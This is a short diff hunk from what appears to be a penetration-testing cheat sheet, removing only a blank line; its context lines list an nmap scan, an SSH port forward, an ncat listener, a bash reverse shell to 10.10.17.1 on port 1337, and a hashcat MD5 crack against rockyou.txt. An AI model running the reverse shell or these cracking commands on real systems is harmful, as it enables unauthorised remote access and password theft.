@@ -7,7 +7,6 @@ nmap -O -v scanme.nmap.org
 ssh -L 8000:12.34.56.789:3306 exampleuser@exampleserver
 
 ncat -l -p 1337
-
 /bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1
 
 hashcat -m 0 -a 0 md5.txt rockyou.txt
